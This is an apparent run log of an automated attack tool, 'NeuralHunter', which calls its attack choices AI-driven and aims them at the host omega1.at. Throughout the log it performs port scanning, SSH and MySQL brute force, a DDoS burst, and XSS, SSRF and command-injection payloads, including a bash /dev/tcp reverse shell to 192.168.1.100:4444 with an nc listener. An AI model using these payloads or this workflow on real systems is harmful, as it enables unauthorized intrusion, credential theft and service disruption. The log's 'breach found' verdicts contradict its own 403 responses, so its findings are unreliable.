2025-11-04 16:21:52,498 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ЛОГЕР v10.1 АКТИВИРОВАН[/bold magenta]
2025-11-04 16:21:52,500 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ХАНТЕР v10.2 АКТИВИРОВАН[/bold magenta]
2025-11-04 16:21:52,884 - NeuralHunter - INFO - [bold cyan]ИИ: ИИ АКТИВИРОВАН: NeuralBrain v10.2[/bold cyan]
2025-11-04 16:21:52,886 - NeuralHunter - INFO - ЦЕПОЧКА: HUNTER → http://omega1.at/FUZZ
2025-11-04 16:21:52,887 - NeuralHunter - INFO - ULTIMATE TOKEN HUNTER → http://omega1.at/FUZZ
2025-11-04 16:21:53,489 - NeuralHunter - INFO - [GET] http://omega1.at/ → 200
2025-11-04 16:21:53,492 - NeuralHunter - INFO - ЦЕПОЧКА: PORT_SCAN → http://omega1.at/FUZZ
2025-11-04 16:21:53,494 - NeuralHunter - INFO - PORT SCAN → http://omega1.at/FUZZ
2025-11-04 16:21:53,586 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 21
2025-11-04 16:21:53,589 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 22
2025-11-04 16:21:53,593 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 80
2025-11-04 16:21:53,597 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 443
2025-11-04 16:21:53,601 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8080
2025-11-04 16:21:53,605 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8443
2025-11-04 16:21:53,609 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 3306
2025-11-04 16:21:53,613 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 5432
2025-11-04 16:21:53,618 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:21:53,619 - NeuralHunter - INFO - MySQL BRUTEFORCE → http://omega1.at/FUZZ
2025-11-04 16:22:20,699 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:22:20,701 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:22:50,866 - NeuralHunter - INFO - ЦЕПОЧКА: SQL → http://omega1.at/FUZZ
2025-11-04 16:22:50,867 - NeuralHunter - INFO - SQL INJECTION → http://omega1.at/FUZZ
2025-11-04 16:22:50,869 - NeuralHunter - ERROR - SQLi ошибка: 'TorClient' object has no attribute 'sync_request'
2025-11-04 16:22:50,870 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:22:50,872 - NeuralHunter - INFO - MySQL BRUTEFORCE → http://omega1.at/FUZZ
2025-11-04 16:23:17,981 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:23:17,983 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:23:48,267 - NeuralHunter - INFO - ЦЕПОЧКА: XSS → http://omega1.at/FUZZ
2025-11-04 16:23:48,269 - NeuralHunter - INFO - XSS АТАКА → http://omega1.at/FUZZ
2025-11-04 16:23:48,269 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 16:23:48,833 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 16:23:48,836 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
2025-11-04 16:23:49,171 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E → 200
2025-11-04 16:23:49,173 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29
2025-11-04 16:23:49,459 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29 → 200
2025-11-04 16:23:49,461 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E
2025-11-04 16:23:49,750 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E → 200
2025-11-04 16:23:49,753 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 16:23:50,233 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 16:23:50,236 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
2025-11-04 16:23:50,723 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E → 403
2025-11-04 16:23:50,726 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:23:50,728 - NeuralHunter - INFO - MySQL BRUTEFORCE → http://omega1.at/FUZZ
2025-11-04 16:24:17,850 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:24:17,852 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:24:48,036 - NeuralHunter - INFO - ЦЕПОЧКА: CSRF → http://omega1.at/FUZZ
2025-11-04 16:24:48,038 - NeuralHunter - INFO - CSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 16:24:48,334 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ → 200
2025-11-04 16:24:48,336 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:24:48,338 - NeuralHunter - INFO - MySQL BRUTEFORCE → http://omega1.at/FUZZ
2025-11-04 16:25:15,456 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:25:15,458 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:25:45,594 - NeuralHunter - INFO - ЦЕПОЧКА: SSRF → http://omega1.at/FUZZ
2025-11-04 16:25:45,596 - NeuralHunter - INFO - SSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 16:25:45,597 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/
2025-11-04 16:25:45,889 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/ → 200
2025-11-04 16:25:45,891 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22
2025-11-04 16:25:46,177 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22 → 200
2025-11-04 16:25:46,179 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd
2025-11-04 16:25:46,683 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd → 403
2025-11-04 16:25:46,684 - NeuralHunter - WARNING - SSRF ЗАБЛОКИРОВАН: 403 на file:///etc/passwd
2025-11-04 16:25:46,686 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///proc/version
2025-11-04 16:25:46,963 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///proc/version → 200
2025-11-04 16:25:46,965 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e
2025-11-04 16:25:47,250 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e → 200
2025-11-04 16:25:47,253 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:25:47,254 - NeuralHunter - INFO - MySQL BRUTEFORCE → http://omega1.at/FUZZ
2025-11-04 16:26:14,344 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:26:14,346 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:26:44,723 - NeuralHunter - INFO - ЦЕПОЧКА: RCE → http://omega1.at/FUZZ
2025-11-04 16:26:44,724 - NeuralHunter - INFO - RCE АТАКА → http://omega1.at/FUZZ
2025-11-04 16:26:44,726 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Bid
2025-11-04 16:26:45,024 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bid → 200
2025-11-04 16:26:45,026 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%7Cwhoami
2025-11-04 16:26:45,318 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%7Cwhoami → 200
2025-11-04 16:26:45,320 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%24%28id%29
2025-11-04 16:26:45,829 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%24%28id%29 → 403
2025-11-04 16:26:45,833 - NeuralHunter - INFO - RCE НАЙДЕН: $(id)
2025-11-04 16:26:45,837 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:26:45,839 - NeuralHunter - INFO - MySQL BRUTEFORCE → http://omega1.at/FUZZ
2025-11-04 16:27:12,848 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:27:12,849 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:27:43,005 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:27:43,006 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 16:27:43,008 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 16:27:43,515 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
2025-11-04 16:27:43,519 - NeuralHunter - INFO - ЦЕПОЧКА: DDOS → http://omega1.at/FUZZ
2025-11-04 16:27:43,521 - NeuralHunter - WARNING - SMART DDOS: 200 запросов → http://omega1.at/FUZZ (ТОЛЬКО НА СВОЙ СЕРВЕР!)
2025-11-04 16:28:50,186 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:28:50,189 - NeuralHunter - INFO - MySQL BRUTEFORCE → http://omega1.at/FUZZ
2025-11-04 16:29:17,288 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:29:17,290 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 16:29:47,545 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 16:29:47,547 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 16:29:47,548 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 16:29:48,052 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
2025-11-04 16:29:48,056 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: PORT_SCAN НАЙДЕНА![/bold red]
2025-11-04 16:29:48,057 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: RCE НАЙДЕНА![/bold red]
2025-11-04 16:29:48,059 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: REVERSE_SHELL НАЙДЕНА![/bold red]
2025-11-04 16:29:48,060 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: DDOS НАЙДЕНА![/bold red]
2025-11-04 16:29:48,061 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: БРЕШЬ: REVERSE_SHELL НАЙДЕНА![/bold red]
2025-11-04 16:29:48,065 - NeuralHunter - INFO - [bold cyan]ИИ: ИИ ЭВОЛЮЦИОНИРОВАЛ: ai_brain.json[/bold cyan]
2025-11-04 16:29:48,070 - NeuralHunter - INFO - [bold green]УСПЕХ: ОТЧЁТ ГОТОВ: JSON + MD + HTML[/bold green]
